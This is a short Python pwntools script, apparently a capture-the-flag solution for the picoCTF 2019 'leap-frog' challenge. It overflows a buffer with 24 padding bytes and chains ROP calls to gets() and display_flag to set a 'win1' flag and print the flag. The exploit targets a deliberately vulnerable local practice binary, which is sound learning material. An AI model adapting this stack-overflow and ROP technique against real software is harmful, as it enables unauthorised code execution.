#!/usr/bin/python

from pwn import *

overflow_offset = 24
binary_path = '/home/yuvaly0/Desktop/pico2019/leap-frog/rop'

e = ELF(binary_path)

rop = ROP(e)
rop.gets(e.symbols['win1'])
rop.display_flag()

garbage = 'A' * overflow_offset

payload = garbage + str(rop)

proc = process(binary_path)
proc.sendlineafter("Enter your input> ", payload)
proc.sendline("\x01\x01\x01")
print proc.recvall()